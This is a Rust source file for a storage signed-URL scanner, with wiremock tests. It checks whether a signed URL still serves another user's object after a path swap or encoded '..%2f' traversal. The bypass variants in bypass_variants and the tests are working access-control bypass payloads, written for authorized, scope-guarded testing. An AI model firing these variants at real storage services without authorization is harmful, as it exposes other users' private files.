//! Signed-URL scanner: proves a storage signed URL stays valid after its
//! object path is swapped or traversed, exposing another user's object.

use riftlock_core::ScopedClient as Client;
use riftlock_core::{
    text_limited_result, CheckState, Coverage, EndpointOutcome, Evidence, Finding, ProofGate,
    ScanError, Scanner, ScopeGuard, SessionMatrix,
};
use url::Url;

/// Path substrings marking storage sign/serve endpoints.
const SIGN_MARKERS: &[&str] = &["/storage/v1/object/sign", "/storage/v1/object/"];

/// Fallback sign path when AST discovery found none (the lab layout).
const DEFAULT_SIGN_PATH: &str = "/storage/v1/object/sign/bucket/user_a_file.jpg";

/// The foreign object a modified signed URL must not be able to read.
const FOREIGN_OBJECT: &str = "user_b_file.jpg";

/// The signed-URL scanner. Endpoints come from AST discovery; the `user_a`
/// session authenticates the sign request, the modified URL is fetched
/// unauthenticated (that is the bypass).
#[derive(Debug, Default)]
pub struct SignedUrlScanner {
    /// Session matrix; `user_a` signs its own object.
    pub sessions: SessionMatrix,
    /// Endpoint paths discovered by AST (absolute, e.g. `/storage/v1/object/sign/bucket/user_a_file.jpg`).
    pub endpoints: Vec<String>,
    /// Coverage for signing and modified-object probes.
    pub coverage: Coverage,
}

/// Candidate sign URLs: discovered storage endpoints, plus the default lab
/// path when discovery found none.
fn candidates(discovered: &[String]) -> Vec<String> {
    let mut paths: Vec<String> = discovered
        .iter()
        .filter(|e| SIGN_MARKERS.iter().any(|m| e.contains(m)))
        .cloned()
        .collect();
    if paths.is_empty() {
        paths.push(DEFAULT_SIGN_PATH.to_owned());
    }
    paths
        .into_iter()
        .collect::<std::collections::BTreeSet<_>>()
        .into_iter()
        .collect()
}

/// The signed URL a sign endpoint handed back. Supabase returns
/// `{"signedURL": "…"}` (also `signedUrl`/`signed_url` across versions).
fn extract_signed_url(body: &str) -> Option<String> {
    let value: serde_json::Value = serde_json::from_str(body).ok()?;
    match &value {
        serde_json::Value::Object(map) => map
            .iter()
            .find(|(k, v)| {
                matches!(k.as_str(), "signedURL" | "signedUrl" | "signed_url") && v.is_string()
            })
            .and_then(|(_, v)| v.as_str().map(str::to_owned)),
        _ => None,
    }
}

/// Modified signed-URL variants pointing at `foreign`: a plain path swap and
/// encoded traversals (a literal `../..` is normalized away by URL parsing;
/// `%2f` survives it and is decoded server-side).
fn bypass_variants(signed: &str, foreign: &str) -> Vec<String> {
    let Some((prefix, _)) = signed.split_once("user_a_file") else {
        return Vec::new();
    };
    // Keep only the original token query; the replaced filename's remainder
    // (e.g. the `.jpg` after the marker) must not survive the swap.
    let suffix = signed
        .split_once('?')
        .map(|(_, q)| format!("?{q}"))
        .unwrap_or_default();
    vec![
        format!("{prefix}{foreign}{suffix}"),
        format!("{prefix}..%2f{foreign}{suffix}"),
        format!("{prefix}..%2f..%2f{foreign}{suffix}"),
    ]
}

/// Whether fetching `modified` unauthenticated served the foreign object:
/// 200 with a non-empty body. A redirect is followed by the client and
/// judged by its final response, a 403/404 is a checked negative.
async fn serves_foreign(client: &Client, modified: &str) -> Result<Option<bool>, ScanError> {
    let resp = client.get(modified).send().await?;
    if resp.status().as_u16() != 200 {
        return Ok(Some(false));
    }
    Ok(text_limited_result(resp)
        .await
        .ok()
        .map(|body| !body.is_empty()))
}

impl Scanner for SignedUrlScanner {
    fn id(&self) -> &'static str {
        "signedurl"
    }

    fn matches(&self, _url: &Url) -> bool {
        // Storage sign endpoints can sit on any host.
        true
    }

    async fn scan(
        &self,
        url: &Url,
        client: &Client,
        guard: &ScopeGuard,
        passive: bool,
    ) -> Result<Vec<Finding>, ScanError> {
        if passive {
            return Ok(Vec::new());
        }
        guard.check_active(url)?;
        let mut findings = Vec::new();
        let Some(user_a) = self.sessions.user_a.as_deref() else {
            // Signing requires an authenticated user; without one the bypass
            // is unprovable (checked negative).
            return Ok(findings);
        };
        for path in candidates(&self.endpoints) {
            let sign_url = url.join(&path).map_err(|_| ScanError::InvalidUrl)?;
            if guard.check(&sign_url).is_err() {
                self.coverage
                    .endpoint_at(sign_url.as_str(), EndpointOutcome::Skipped);
                continue;
            }
            let sign_check = self.coverage.begin_check();
            let resp = match client
                .get(sign_url.clone())
                .header("Authorization", format!("Bearer {user_a}"))
                .send()
                .await
            {
                Ok(resp) => resp,
                Err(error) => {
                    let timed_out = error.is_timeout();
                    self.coverage.endpoint_at(
                        sign_url.as_str(),
                        if timed_out {
                            EndpointOutcome::TimedOut
                        } else {
                            EndpointOutcome::Failed
                        },
                    );
                    let _ = sign_check.finish(if timed_out {
                        CheckState::TimedOut
                    } else {
                        CheckState::Failed
                    });
                    continue;
                }
            };
            if resp.status().as_u16() != 200 {
                let outcome = riftlock_core::classify(resp.status().as_u16());
                self.coverage.endpoint_at(sign_url.as_str(), outcome);
                let _ = sign_check.finish(
                    if matches!(
                        outcome,
                        EndpointOutcome::AuthRequired | EndpointOutcome::WafBlocked
                    ) {
                        CheckState::Inconclusive
                    } else {
                        CheckState::Completed
                    },
                );
                continue;
            }
            let body = match text_limited_result(resp).await {
                Ok(body) => body,
                Err(_) => {
                    self.coverage
                        .endpoint_at(sign_url.as_str(), EndpointOutcome::Failed);
                    let _ = sign_check.finish(CheckState::Inconclusive);
                    continue;
                }
            };
            self.coverage
                .endpoint_at(sign_url.as_str(), EndpointOutcome::Tested);
            let _ = sign_check.finish(CheckState::Completed);
            let Some(signed) = extract_signed_url(&body) else {
                continue;
            };
            let signed = url.join(&signed).map_err(|_| ScanError::InvalidUrl)?;
            for modified in bypass_variants(signed.as_str(), FOREIGN_OBJECT) {
                let target = Url::parse(&modified).map_err(|_| ScanError::InvalidUrl)?;
                if guard.check(&target).is_err() {
                    self.coverage
                        .endpoint_at(target.as_str(), EndpointOutcome::Skipped);
                    continue;
                }
                let object_check = self.coverage.begin_check();
                let serves = match serves_foreign(client, target.as_str()).await {
                    Ok(Some(serves)) => serves,
                    Ok(None) => {
                        self.coverage
                            .endpoint_at(target.as_str(), EndpointOutcome::Failed);
                        let _ = object_check.finish(CheckState::Inconclusive);
                        continue;
                    }
                    Err(error) => {
                        let timed_out = matches!(
                            &error,
                            ScanError::Http(http_error) if http_error.is_timeout()
                        );
                        self.coverage.endpoint_at(
                            target.as_str(),
                            if timed_out {
                                EndpointOutcome::TimedOut
                            } else {
                                EndpointOutcome::Failed
                            },
                        );
                        let _ = object_check.finish(if timed_out {
                            CheckState::TimedOut
                        } else {
                            CheckState::Failed
                        });
                        continue;
                    }
                };
                self.coverage.endpoint_at(
                    target.as_str(),
                    if serves {
                        EndpointOutcome::Tested
                    } else {
                        EndpointOutcome::Skipped
                    },
                );
                let _ = object_check.finish(CheckState::Completed);
                if serves {
                    findings.push(ProofGate::admit(Evidence::SignedUrlBypass {
                        endpoint: target.to_string(),
                        object_id: FOREIGN_OBJECT.to_owned(),
                    })?);
                    // One proof is enough; further probes add nothing.
                    return Ok(findings);
                }
            }
        }
        Ok(findings)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sessions_with(token: &str) -> SessionMatrix {
        SessionMatrix {
            user_a: Some(token.to_owned()),
            ..Default::default()
        }
    }

    #[test]
    fn extract_signed_url_from_supabase_shape() {
        assert_eq!(
            extract_signed_url(
                r#"{"signedURL": "/storage/v1/object/sign/bucket/user_a_file.jpg?token=x"}"#
            ),
            Some("/storage/v1/object/sign/bucket/user_a_file.jpg?token=x".to_owned())
        );
        assert_eq!(extract_signed_url(r#"{"error": "nope"}"#), None);
        assert_eq!(extract_signed_url("<html>"), None);
    }

    #[test]
    fn bypass_variants_swap_and_traverse() {
        let signed = "http://h/storage/v1/object/sign/bucket/user_a_file.jpg?token=x".to_owned();
        let variants = bypass_variants(&signed, "user_b_file.jpg");
        assert_eq!(
            variants,
            vec![
                "http://h/storage/v1/object/sign/bucket/user_b_file.jpg?token=x".to_owned(),
                "http://h/storage/v1/object/sign/bucket/..%2fuser_b_file.jpg?token=x".to_owned(),
                "http://h/storage/v1/object/sign/bucket/..%2f..%2fuser_b_file.jpg?token=x"
                    .to_owned(),
            ]
        );
        // No marker in the signed URL: no variants, no bypass attempt.
        assert!(bypass_variants("http://h/other.jpg?token=x", "user_b_file.jpg").is_empty());
    }

    #[tokio::test]
    async fn scan_proves_foreign_object_read() {
        let server = wiremock::MockServer::start().await;
        let sign_path = "/storage/v1/object/sign/bucket/user_a_file.jpg";
        // Sign endpoint hands user_a a token for their own object.
        wiremock::Mock::given(wiremock::matchers::method("GET"))
            .and(wiremock::matchers::path(sign_path))
            .and(wiremock::matchers::header("Authorization", "Bearer tok"))
            .respond_with(
                wiremock::ResponseTemplate::new(200)
                    .set_body_string(format!(r#"{{"signedURL": "{sign_path}?token=x"}}"#)),
            )
            .mount(&server)
            .await;
        // The token-protected serve endpoint validates only the token, not
        // the path: any GET with the token in the query serves an object.
        wiremock::Mock::given(wiremock::matchers::method("GET"))
            .and(wiremock::matchers::query_param("token", "x"))
            .respond_with(
                wiremock::ResponseTemplate::new(200).set_body_string("user-b-object-bytes"),
            )
            .mount(&server)
            .await;

        let base = Url::parse(server.uri().as_str()).expect("url");
        let guard = ScopeGuard::new_lab(&[server.uri().as_str()]).expect("guard");
        let scanner = SignedUrlScanner {
            sessions: sessions_with("tok"),
            ..Default::default()
        };
        let findings = Scanner::scan(&scanner, &base, &Client::new_lab(), &guard, false)
            .await
            .expect("scan");
        assert_eq!(findings.len(), 1);
        assert!(matches!(
            findings[0].evidence(),
            Evidence::SignedUrlBypass { endpoint, object_id }
                if endpoint.contains("user_b_file.jpg") && object_id == "user_b_file.jpg"
        ));
    }

    #[tokio::test]
    async fn scan_negative_when_path_swap_is_rejected() {
        let server = wiremock::MockServer::start().await;
        let sign_path = "/storage/v1/object/sign/bucket/user_a_file.jpg";
        wiremock::Mock::given(wiremock::matchers::method("GET"))
            .and(wiremock::matchers::path(sign_path))
            .and(wiremock::matchers::header("Authorization", "Bearer tok"))
            .respond_with(
                wiremock::ResponseTemplate::new(200)
                    .set_body_string(format!(r#"{{"signedURL": "{sign_path}?token=x"}}"#)),
            )
            .mount(&server)
            .await;
        // Serve endpoint binds the token to the signed path: the swap is 403.
        wiremock::Mock::given(wiremock::matchers::method("GET"))
            .and(wiremock::matchers::path(sign_path))
            .and(wiremock::matchers::query_param("token", "x"))
            .respond_with(wiremock::ResponseTemplate::new(200).set_body_string("own-bytes"))
            .mount(&server)
            .await;
        wiremock::Mock::given(wiremock::matchers::method("GET"))
            .respond_with(wiremock::ResponseTemplate::new(403))
            .mount(&server)
            .await;

        let base = Url::parse(server.uri().as_str()).expect("url");
        let guard = ScopeGuard::new_lab(&[server.uri().as_str()]).expect("guard");
        let scanner = SignedUrlScanner {
            sessions: sessions_with("tok"),
            ..Default::default()
        };
        let findings = Scanner::scan(&scanner, &base, &Client::new_lab(), &guard, false)
            .await
            .expect("scan");
        assert!(findings.is_empty());
    }

    #[tokio::test]
    async fn corrupt_gzip_signed_url_body_is_failed_and_inconclusive() {
        let server = wiremock::MockServer::start().await;
        let base = Url::parse(server.uri().as_str()).expect("url");
        wiremock::Mock::given(wiremock::matchers::method("GET"))
            .and(wiremock::matchers::path(DEFAULT_SIGN_PATH))
            .and(wiremock::matchers::header("Authorization", "Bearer tok"))
            .respond_with(
                wiremock::ResponseTemplate::new(200)
                    .insert_header("content-encoding", "gzip")
                    .set_body_bytes(b"not a gzip stream".to_vec()),
            )
            .mount(&server)
            .await;
        let guard = ScopeGuard::new_lab(&[server.uri().as_str()]).expect("guard");
        let scanner = SignedUrlScanner {
            sessions: sessions_with("tok"),
            ..Default::default()
        };

        let findings = Scanner::scan(&scanner, &base, &Client::new_lab(), &guard, false)
            .await
            .expect("unreadable signing response is inconclusive");
        assert!(findings.is_empty());
        let snap = scanner.coverage.snapshot(0);
        assert_eq!(snap.endpoints_failed, 1);
        assert_eq!(snap.vulnerability_checks_inconclusive, 1);
        assert!(snap.check_accounting_invariant());
        assert!(scanner.coverage.finalize().reconciles());
    }

    #[tokio::test]
    async fn scan_skips_without_user_session() {
        let server = wiremock::MockServer::start().await;
        wiremock::Mock::given(wiremock::matchers::method("GET"))
            .respond_with(wiremock::ResponseTemplate::new(200))
            .mount(&server)
            .await;
        let base = Url::parse(server.uri().as_str()).expect("url");
        let guard = ScopeGuard::new_lab(&[server.uri().as_str()]).expect("guard");
        let findings = Scanner::scan(
            &SignedUrlScanner::default(),
            &base,
            &Client::new_lab(),
            &guard,
            false,
        )
        .await
        .expect("scan");
        assert!(findings.is_empty());
    }

    #[tokio::test]
    async fn scan_negative_in_passive_mode() {
        let server = wiremock::MockServer::start().await;
        let base = Url::parse(server.uri().as_str()).expect("url");
        let guard = ScopeGuard::new_lab(&[server.uri().as_str()]).expect("guard");
        let scanner = SignedUrlScanner {
            sessions: sessions_with("tok"),
            ..Default::default()
        };
        let findings = Scanner::scan(&scanner, &base, &Client::new_lab(), &guard, true)
            .await
            .expect("scan");
        assert!(findings.is_empty());
    }
}
